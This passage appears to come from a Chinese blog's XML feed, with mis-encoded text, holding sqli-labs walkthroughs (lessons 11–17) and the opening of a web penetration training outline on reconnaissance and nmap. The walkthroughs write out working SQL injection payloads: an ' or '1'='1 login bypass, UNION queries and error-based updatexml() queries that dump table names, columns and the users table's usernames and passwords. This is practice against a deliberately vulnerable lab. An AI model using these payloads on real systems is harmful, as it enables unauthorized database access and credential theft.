title="5.mysql_real_escape_string()å‡½æ•°"></a>5.mysql_real_escape_string()å‡½æ•°</h5><p>è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼š<img src="/lesson17/1.png" alt="1"></p><p><strong>spï¼š</strong>æ€ä¹ˆç†è§£è¿™ä¸ªè½¬ä¹‰å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼ŒPHPæŠŠè¾“å…¥æ•°æ®ä¸­çš„å•å¼•å·è½¬ä¹‰äº†ï¼ˆå•å¼•å·å‰åŠ äº†ä¸ªåæ–œæ ï¼‰å˜æˆå­—ç¬¦ä¸²ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆè¾“å…¥æ•°æ®ä»£å…¥æ•°æ®åº“sqlè¯­å¥æ—¶ï¼Œè¿™ä¸ªè½¬ä¹‰åçš„å•å¼•å·å°±æ— æ³•ä½œä¸ºå­—ç¬¦ä¸æ•°æ®åº“sqlè¯­å¥ä¸­æœ¬æ¥å­˜åœ¨çš„å•å¼•å·åˆå¹¶ï¼Œæ‰€ä»¥æ— æ³•ç¯¡æ”¹sqlè¯­å¥ã€‚</p><p>æˆ‘ä»¬è§‚å¯Ÿæºç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[&#x27;uname&#x27;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$<span class="keyword">update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç”±äºæ•°æ®åº“ä¸­å¯¹è¾“å…¥çš„usernameä¸€é¡¿æ“ä½œï¼Œé‚£ä¹ˆä»usernameä¸‹æ‰‹è‚¯å®šåƒä¸äº†å…œç€èµ°ï¼Œæ‰€ä»¥è½¬å˜æ€è·¯å¯ä»¥ä»passwordä¸‹æ‰‹ã€‚</p><p>è¾“å…¥username=root ï¼›password=rootâ€™ï¼Œé¡µé¢æŠ¥sqlè¯­æ³•é”™è¯¯ï¼Œç¡®å®šæ³¨å…¥ç‚¹ä¸ºï¼šâ€™  ;</p><p><strong>ï¼è¿™é‡Œä»‹ç»ä¸€ä¸ªæ³¨å…¥æ–¹æ³•ï¼š</strong></p><h3 id="æŠ¥é”™æ³¨å…¥ï¼š"><a href="#æŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="æŠ¥é”™æ³¨å…¥ï¼š"></a>æŠ¥é”™æ³¨å…¥ï¼š</h3><h5 id="A-å¸¸ç”¨å‡½æ•°ï¼š"><a href="#A-å¸¸ç”¨å‡½æ•°ï¼š" class="headerlink" title="A.å¸¸ç”¨å‡½æ•°ï¼š"></a>A.å¸¸ç”¨å‡½æ•°ï¼š</h5><h6 id="1-updatexml-å‡½æ•°ï¼š"><a href="#1-updatexml-å‡½æ•°ï¼š" class="headerlink" title="1.updatexml()å‡½æ•°ï¼š"></a>1.updatexml()å‡½æ•°ï¼š</h6><p>updatexml(xml_doc,xpath,new_value)å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯(xml_document, XPath_string, new_value)â€”-</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentï¼Œ Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼›</p><p>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)ï¼›</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼Œ Stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®ï¼›</p><p>è¯¥å‡½æ•°çš„ä½œç”¨å°±æ˜¯æŠŠxmlæ–‡æ¡£ä¸­çš„æŒ‡å®šå­—ç¬¦ä¸²æ›¿æ¢æˆæ–°å€¼ã€‚</p><p><img src="/lesson17/2.png" alt="2"></p><h6 id="2-extractvalue-å‡½æ•°ï¼š"><a href="#2-extractvalue-å‡½æ•°ï¼š" class="headerlink" title="2.extractvalue()å‡½æ•°ï¼š"></a>2.extractvalue()å‡½æ•°ï¼š</h6><p>extractvalue(xml_doc, xpath)å‡½æ•°ä½œç”¨æ˜¯ä»æŒ‡å®šxmlæ–‡æ¡£ä¸­æŸ¥è¯¢æŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚</p><h5 id><a href="#" class="headerlink" title></a><img src="/lesson17/3.png" alt="3"></h5><h5 id="B-æŠ¥é”™æ³¨å…¥åŸç†ï¼š"><a href="#B-æŠ¥é”™æ³¨å…¥åŸç†ï¼š" class="headerlink" title="B.æŠ¥é”™æ³¨å…¥åŸç†ï¼š"></a>B.æŠ¥é”™æ³¨å…¥åŸç†ï¼š</h5><p>(1)å‚æ•°xpathéœ€è¦çš„æ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä¸æ˜¯å°±ä¼šæŠ¥é”™ã€‚</p><p>(2))å½“xpathè·¯å¾„è¯­æ³•é”™è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™ã€‚</p><p>æ³¨ï¼šæŠ¥é”™çš„é•¿åº¦æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„ï¼Œä¸è¦æ„é€ è¿‡é•¿çš„payloadï¼Œå¦åˆ™åé¢çš„å­—ç¬¦ä¸²ä¼šè¢«æˆªæ–­ã€‚</p><p>æ‡‚å¾—äº†ä»¥ä¸ŠçŸ¥è¯†å°±å¯ä»¥å¼€å§‹æ³¨å…¥äº†ã€‚å› ä¸ºä¸¤ç§å‡½æ•°çš„æ³¨å…¥æ–¹æ³•å¤§ç›¸å¾„åº­ï¼Œæ‰€ä»¥ä¸‹é¢æˆ‘å°±ä¸¾updatexmlä¸ºä¾‹è§£é¢˜ã€‚</p><h3 id="çˆ†åº“ï¼š"><a href="#çˆ†åº“ï¼š" class="headerlink" title="çˆ†åº“ï¼š"></a>çˆ†åº“ï¼š</h3><p>è¾“å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=(anything)&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;, database()),1)#</span></span><br></pre></td></tr></table></figure><p>å¾—ï¼š<img src="/lesson17/4.png" alt="4"></p><p>æ³¨ï¼š#å­—ç¬¦æ˜¯ä¸ºäº†ä½¿xpathè·¯å¾„è¯­æ³•é”™è¯¯ï¼Œä¹Ÿå¯ä»¥ç”¨åˆ«çš„å­—ç¬¦ä»£æ›¿ã€‚</p><h3 id="çˆ†è¡¨ï¼š"><a href="#çˆ†è¡¨ï¼š" class="headerlink" title="çˆ†è¡¨ï¼š"></a>çˆ†è¡¨ï¼š</h3><p>è¾“å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure><p>å¾—ï¼š<img src="/lesson17/5.png" alt="5"></p><h3 id="çˆ†åˆ—ï¼š"><a href="#çˆ†åˆ—ï¼š" class="headerlink" title="çˆ†åˆ—ï¼š"></a>çˆ†åˆ—ï¼š</h3><p>è¾“å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure><p>å¾—ï¼š<img src="/lesson17/6.png" alt="6"></p><h3 id="çˆ†å€¼ï¼š"><a href="#çˆ†å€¼ï¼š" class="headerlink" title="çˆ†å€¼ï¼š"></a>çˆ†å€¼ï¼š</h3><p>è¾“å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x)),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å¾—ï¼š<img src="/lesson17/7.png" alt="7"></p><h5 id="æ³¨ï¼š"><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a>æ³¨ï¼š</h5><p>1.çˆ†å€¼çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œä¸èƒ½ç›´æ¥ç”¨ç®€å•çš„<code>select concat(username)</code>ï¼Œè¿™æ ·ä¼šå¼•èµ·æŠ¥é”™ï¼š<img src="/lesson17/8.png" alt="8"></p><p>åŸå› æ˜¯ï¼šåœ¨åŒä¸€ä¸ªè¯­å¥ä¸­ï¼Œä¸èƒ½å…ˆæŸ¥è¯¢è¡¨ä¸­çš„å€¼å†updateè¿™ä¸ªè¡¨ï¼Œå¯ä»¥å…ˆæŠŠæŸ¥è¯¢å‡ºçš„å€¼ä½œä¸ºä¸€ä¸ªæ´¾ç”Ÿè¡¨ï¼Œç„¶ååœ¨è¿™ä¸ªæ´¾ç”Ÿè¡¨é‡Œé¢å†æ¬¡è¿›è¡ŒæŸ¥è¯¢ã€‚</p><p><img src="/lesson17/9.png" alt="9"></p><p>2.ç”±äºç”¨æˆ·æ•°æ®è¾ƒå¤šï¼Œä¸”æŠ¥é”™å†…å®¹æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ³¨å…¥æ˜¯å¯ä»¥é€šè¿‡æ”¹å˜limitå‡½æ•°å˜é‡æ¥æ§åˆ¶</p><p>å›æ˜¾å†…å®¹ã€‚</p><p><strong>spï¼šå›é¡¾ä¸€ä¸‹å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</strong></p><p><strong>1.concat(str1,str2,â€¦)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</strong><br><strong>2.concat_ws(â€˜separatorâ€™,str1,str2,â€¦)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</strong><br><strong>3.group_concat(str1,str2,â€¦)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lesson17ï¼š&quot;&gt;&lt;a href=&quot;#lesson17ï¼š&quot; class=&quot;headerlink&quot; title=&quot;lesson17ï¼š&quot;&gt;&lt;/a&gt;lesson17ï¼š&lt;/h1&gt;&lt;p&gt;è¿™ä¸€å…³ä¸ç®¡æˆ‘ä»¬åœ¨usernameä¸Šæ„é€ ä»€ä¹ˆpayloadéƒ½æ— æ³•ç¯¡æ”¹æ•°æ®åº“ã€‚&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson11-16</title>
    <link href="http://example.com/2021/01/30/lesson11-16/"/>
    <id>http://example.com/2021/01/30/lesson11-16/</id>
    <published>2021-01-30T14:56:26.000Z</published>
    <updated>2021-02-02T16:08:57.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="postæ³¨å…¥"><a href="#postæ³¨å…¥" class="headerlink" title="postæ³¨å…¥"></a>postæ³¨å…¥</h2><p>Qï¼šä»€ä¹ˆæ˜¯post</p><p>Aï¼šç”¨æˆ·å°†æ•°æ®ä»ç½‘é¡µæˆ–è€…å®¢æˆ·ç«¯æäº¤ åˆ°æœåŠ¡å™¨ç«¯ï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨ç™»å½•è¿‡ç¨‹ä¸­ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨æˆ·åå’Œå¯†ç ä»¥è¡¨å•çš„å½¢å¼æäº¤ï¼Œ æäº¤åˆ°æœåŠ¡å™¨åæœåŠ¡å™¨å†åœ¨æ•°æ®åº“ä¸­è¿›è¡ŒéªŒè¯ã€‚</p><p>Qï¼šä¸getæ³¨å…¥çš„åŒºåˆ«</p><p>Aï¼šgetè¯·æ±‚ä¸å‘é€æ•°æ®è‡³æœåŠ¡å™¨ï¼Œè€Œpostè¯·æ±‚åŒ…å«æ•°æ®æäº¤</p><h3 id="postç±»å‹sqlæ³¨å…¥åŸç†ï¼š"><a href="#postç±»å‹sqlæ³¨å…¥åŸç†ï¼š" class="headerlink" title="postç±»å‹sqlæ³¨å…¥åŸç†ï¼š"></a>postç±»å‹sqlæ³¨å…¥åŸç†ï¼š</h3><p>å°†ç”¨æˆ·çš„è¾“å…¥å½“ä½œä»£ç /æŒ‡ä»¤ï¼Œåœ¨æ•°æ®åº“ä¸­æ“ä½œã€æ‰§è¡Œã€‚</p><h1 id="lesson11ï¼š"><a href="#lesson11ï¼š" class="headerlink" title="lesson11ï¼š"></a>lesson11ï¼š</h1><p>lesson11çš„æºç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹lesson11çš„æºç æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹è¾“å…¥çš„å†…å®¹è¿›è€Œä¿®æ”¹æ•°æ®åº“ä¸­ä»£ç ï¼Œ</p><p>å¦‚username=rootâ€˜ or â€™1â€™=â€˜1ï¼Œpassword=éšæ„ï¼›å‘ç°ç™»å…¥æˆåŠŸã€‚ï¼ˆusernameå¸¦å…¥æ•°æ®åº“ä¸ºï¼š@$sql=â€SELECT username, password FROM users WHERE username=â€™$rootâ€˜ or â€™1â€™=â€˜1â€™ and password=â€™$éšæ„â€™ LIMIT 0,1â€;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åªè¦æ•°æ®åº“ä¸­å­˜åœ¨ç”¨æˆ·rootï¼Œé‚£ä¹ˆè¿™ä¸ªè¯­å¥æ’æˆç«‹ï¼‰</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥é€šè¿‡æ›´æ”¹ä¸Šä¼ æ•°æ®æ¥è¾¾åˆ°è·å–æ•°æ®åº“ä¿¡æ¯çš„ç›®çš„ã€‚</p><h4 id="ä¸€-çˆ†åº“"><a href="#ä¸€-çˆ†åº“" class="headerlink" title="ä¸€.çˆ†åº“"></a>ä¸€.çˆ†åº“</h4><p>è¾“å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å¾—ï¼š<img src="/lesson11-16/1.png" alt="1"></p><h4 id="äºŒ-çˆ†è¡¨"><a href="#äºŒ-çˆ†è¡¨" class="headerlink" title="äºŒ.çˆ†è¡¨"></a>äºŒ.çˆ†è¡¨</h4><p>è¾“å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å¾—ï¼š<img src="/lesson11-16/2.png" alt="2"></p><h4 id="ä¸‰-çˆ†åˆ—"><a href="#ä¸‰-çˆ†åˆ—" class="headerlink" title="ä¸‰.çˆ†åˆ—"></a>ä¸‰.çˆ†åˆ—</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å¾—ï¼š<img src="/lesson11-16/3.png" alt="3"></p><h4 id="å››-çˆ†å€¼"><a href="#å››-çˆ†å€¼" class="headerlink" title="å››.çˆ†å€¼"></a>å››.çˆ†å€¼</h4><p>è¾“å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>), (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å¾—ï¼š<img src="/lesson11-16/4.png" alt="4"></p><h1 id="lesson12ï¼š"><a href="#lesson12ï¼š" class="headerlink" title="lesson12ï¼š"></a>lesson12ï¼š</h1><p>lesson12çš„æºç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; </span><br><span class="line">@$sql=&quot;<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=($uname) <span class="keyword">and</span> <span class="keyword">password</span>=     ($passwd) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºä»£ç ä¸æ˜¯å¾ˆèƒ½ç›´è§‚çœ‹å‡ºæ•°æ®åº“å¦‚ä½•é—­åˆå‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡ç½‘é¡µæ£€æµ‹å…¶æ˜¯å¦‚ä½•é—­åˆå‚æ•°çš„ï¼š</p><p>username=aâ€™aâ€aâ€™)a</p><p>å¾—ï¼š<img src="/lesson11-16/5.png" alt="5"></p><p>æˆ‘ä»¬é€šè¿‡è§‚å¯Ÿpasswordéƒ¨åˆ†å¯çŸ¥æ³¨å…¥ç‚¹ä¸ºâ€˜â€™ï¼‰ï¼›</p><p>ä½†æ˜¯å½“æˆ‘æ„é€ payloadï¼šrootâ€˜â€™ï¼‰#æ—¶æˆ‘å‘ç°é¡µé¢è¿”å›é”™è¯¯ï¼Œè€Œä¸”æˆ‘å‘ç°è¿™å…³æ— æ³•é€šè¿‡æ³¨é‡Šè¾¾åˆ°ç¯¡æ”¹æ•°æ®åº“ã€‚</p><p>å‰©ä¸‹çš„å’Œlesson11ä¸€æ ·ã€‚</p><h1 id="lesson13ï¼š"><a href="#lesson13ï¼š" class="headerlink" title="lesson13ï¼š"></a>lesson13ï¼š</h1><p>é€šè¿‡æŸ¥çœ‹æºç ï¼Œæˆ–åœ¨ç½‘é¡µä¸Šè¾“å…¥é”™è¯¯sqlè¯­æ³•ï¼Œå¯çŸ¥æ³¨å…¥ç‚¹ä¸ºï¼šâ€˜ï¼‰</p><p>ä½†æ˜¯ç™»å…¥æˆåŠŸåæˆ‘ä»¬çœ‹ä¸åˆ°é¡µé¢æœ‰å›æ˜¾æ•°æ®ï¼Œé‚£ä¹ˆè¿™é¢˜è¦é‡‡ç”¨ç›²æ³¨ï¼ˆå‚è€ƒç¬¬äº”å…³ã€ç¬¬å…«å…³ï¼‰ã€‚</p><h1 id="lesson14ï¼š"><a href="#lesson14ï¼š" class="headerlink" title="lesson14ï¼š"></a>lesson14ï¼š</h1><p>é€šè¿‡æŸ¥çœ‹æºç ï¼Œæˆ–åœ¨ç½‘é¡µä¸Šè¾“å…¥é”™è¯¯sqlè¯­æ³•ï¼Œå¯çŸ¥æ³¨å…¥ç‚¹ä¸º ï¼šâ€</p><p>ä½†æ˜¯ç™»å…¥æˆåŠŸåæˆ‘ä»¬çœ‹ä¸åˆ°é¡µé¢æœ‰å›æ˜¾æ•°æ®ï¼Œé‚£ä¹ˆè¿™é¢˜è¦é‡‡ç”¨ç›²æ³¨ï¼ˆå‚è€ƒç¬¬äº”å…³ã€ç¬¬å…«å…³ï¼‰ã€‚</p><h1 id="lesson15ï¼š"><a href="#lesson15ï¼š" class="headerlink" title="lesson15ï¼š"></a>lesson15ï¼š</h1><p>æ— æ³•é€šè¿‡sqlè¯­æ³•é”™è¯¯æ¥æ£€æµ‹æ•°æ®åº“é—­åˆå‚æ•°ç±»å‹ï¼Œ</p><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">&#x27;$uname&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$passwd&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç‚¹ä¸ºï¼šâ€™      ï¼›</p><p>ç™»å…¥æˆåŠŸï¼Œæ— å›æ˜¾ï¼Œç›²æ³¨ï¼ˆå‚è€ƒç¬¬äº”å…³ã€ç¬¬å…«å…³ï¼‰ã€‚</p><h1 id="lesson16ï¼š"><a href="#lesson16ï¼š" class="headerlink" title="lesson16ï¼š"></a>lesson16ï¼š</h1><p>åšè¿™å…³çš„æ—¶å€™æ”¾äº†ä¸€ä¸ªé”™è¯¯å¡äº†å¥½ä¹…ï¼šæŠŠâ€œï¼‰å‹çš„åŒå¼•å·ç”¨ä¸¤ä¸ªå•å¼•å·ä»£æ›¿äº†ï¼Œå¯¼è‡´ä¸€ç›´è¾“å…¥è¿”å›å€¼é”™è¯¯ã€‚</p><p>æŸ¥çœ‹æºç å¯å¾—æ³¨å…¥ç‚¹ä¸ºï¼šâ€)ï¼›</p><p>ç™»å…¥æˆåŠŸï¼Œæ— å›æ˜¾ï¼Œç›²æ³¨ï¼ˆå‚è€ƒç¬¬äº”å…³ã€ç¬¬å…«å…³ï¼‰ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;postæ³¨å…¥&quot;&gt;&lt;a href=&quot;#postæ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;postæ³¨å…¥&quot;&gt;&lt;/a&gt;postæ³¨å…¥&lt;/h2&gt;&lt;p&gt;Qï¼šä»€ä¹ˆæ˜¯post&lt;/p&gt;
&lt;p&gt;Aï¼šç”¨æˆ·å°†æ•°æ®ä»ç½‘é¡µæˆ–è€…å®¢æˆ·ç«¯æäº¤ åˆ°æœåŠ¡å™¨ç«¯ï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨ç™»å½•è¿‡ç¨‹ä¸­ï¼Œè¾“å…¥</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>2021.1æœˆwebæ¸—é€åŸ¹è®­</title>
    <link href="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/"/>
    <id>http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/</id>
    <published>2021-01-27T02:56:06.000Z</published>
    <updated>2021-01-29T03:13:47.624Z</updated>
    
    <content type="html"><![CDATA[<h3 id="webæ¸—é€çš„å®è§‚æ€è·¯ï¼š"><a href="#webæ¸—é€çš„å®è§‚æ€è·¯ï¼š" class="headerlink" title="webæ¸—é€çš„å®è§‚æ€è·¯ï¼š"></a>webæ¸—é€çš„å®è§‚æ€è·¯ï¼š</h3><h5 id="a-ä¿¡æ¯æ”¶é›†"><a href="#a-ä¿¡æ¯æ”¶é›†" class="headerlink" title="a.ä¿¡æ¯æ”¶é›†"></a>a.ä¿¡æ¯æ”¶é›†</h5><h5 id="b-æ¼æ´æŒ–æ˜"><a href="#b-æ¼æ´æŒ–æ˜" class="headerlink" title="b.æ¼æ´æŒ–æ˜"></a>b.æ¼æ´æŒ–æ˜</h5><h5 id="c-æ¼æ´åˆ©ç”¨"><a href="#c-æ¼æ´åˆ©ç”¨" class="headerlink" title="c.æ¼æ´åˆ©ç”¨"></a>c.æ¼æ´åˆ©ç”¨</h5><h5 id="d-è¾“å‡ºæ¸—é€æµ‹è¯•æŠ¥å‘Š"><a href="#d-è¾“å‡ºæ¸—é€æµ‹è¯•æŠ¥å‘Š" class="headerlink" title="d.è¾“å‡ºæ¸—é€æµ‹è¯•æŠ¥å‘Š"></a>d.è¾“å‡ºæ¸—é€æµ‹è¯•æŠ¥å‘Š</h5><h4 id="ä¸€-ä¿¡æ¯æ”¶é›†"><a href="#ä¸€-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€.ä¿¡æ¯æ”¶é›†"></a>ä¸€.ä¿¡æ¯æ”¶é›†</h4><p>1.åŸºæœ¬ä¿¡æ¯ï¼š</p><p>ã€ŠåŸŸåä¿¡æ¯ï¼Œå­åŸŸåï¼Œipåœ°å€ï¼ŒåŒIPçš„å…¶ä»–ç½‘ç«™ä¿¡æ¯â€“ç«™é•¿ä¹‹å®¶ï¼›</p><p>â€‹    è·å–å­åŸŸåâ€“å­åŸŸåæŒ–æ˜æœº</p><p>â€‹    è·å–åŸŸåæˆ–IPåœ°å€â€“<a href="http://viewdns.infoã€https//www.dnsdb.io">http://viewdns.infoã€https://www.dnsdb.io</a></p><p>â€‹    æ ¹æ®IPåœ°å€æŸ¥è¯¢åŒä¸€IPåœ°å€çš„å…¶ä»–ä¿¡æ¯â€“<a href="http://114best.com/ip/114.aspx?w=">http://114best.com/ip/114.aspx?w=</a></p><p>ã€Šç«¯å£ï¼š80ï¼ˆhttpï¼‰443ï¼ˆHTTPSï¼‰ 445ï¼ˆå…±äº«æ–‡ä»¶å¤¹ï¼‰ï¼›</p><p>ã€ŠæœåŠ¡ï¼ˆwebç‰ˆæœ¬ï¼‰ï¼ŒæœåŠ¡ç‰ˆæœ¬ï¼›</p><p>2.osæ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼š</p><p>linuxï¼Œwindï¼Œmac</p><p>3.webä¸­é—´ä»¶ï¼ˆwebç¨‹åºï¼Œç”¨æ¥æä¾›ç½‘é¡µæœåŠ¡ï¼‰</p><p>Apacheï¼ˆä¸»æµï¼‰ï¼Œiisï¼ŒNginxï¼Œweblogic</p><p>4.æ•°æ®åº“</p><p>ç±»å‹ã€ç‰ˆæœ¬ï¼šmysqlï¼Œmssqlï¼Œoracleï¼Œaccess</p><p>5.æœåŠ¡å™¨åç«¯çš„è„šæœ¬ç±»å‹ã€ç‰ˆæœ¬</p><p>PHPã€JSPã€ASP</p><h5 id="ç«¯å£æ‰«ææŠ€æœ¯â€“NMAP"><a href="#ç«¯å£æ‰«ææŠ€æœ¯â€“NMAP" class="headerlink" title="~ç«¯å£æ‰«ææŠ€æœ¯â€“NMAP"></a>~ç«¯å£æ‰«ææŠ€æœ¯â€“NMAP</h5><p>åŸºæœ¬å‘½ä»¤æ ¼å¼ï¼šnmap -å‚æ•° ip/ipæ®µ/ä¸»æœºåœ°å€</p><h6 id="Nmap-TCPæ‰«æç«¯å£é€‰é¡¹"><a href="#Nmap-TCPæ‰«æç«¯å£é€‰é¡¹" class="headerlink" title="Nmap TCPæ‰«æç«¯å£é€‰é¡¹:"></a>Nmap TCPæ‰«æç«¯å£é€‰é¡¹:</h6><p>-sPï¼šç”¨pingçš„æ–¹å¼åˆ¤æ–­æ˜¯å¦æœ‰å­˜æ´»ä¸»æœº,ä¸æ‰«æç«¯å£ã€‚<br>-sTï¼šä½¿ç”¨TCPè¿æ¥æ‰«æï¼Œå¯¹ç›®æ ‡ä¸»æœºæ‰€æœ‰ç«¯å£è¿›è¡Œå®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¦‚æœæˆåŠŸå»ºç«‹è¿æ¥åˆ™ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚<br>-sSï¼šä½¿ç”¨åŠå¼€è¿æ¥ï¼ˆSYN stealth)æ‰«æï¼Œä½¿ç”¨SYNæ 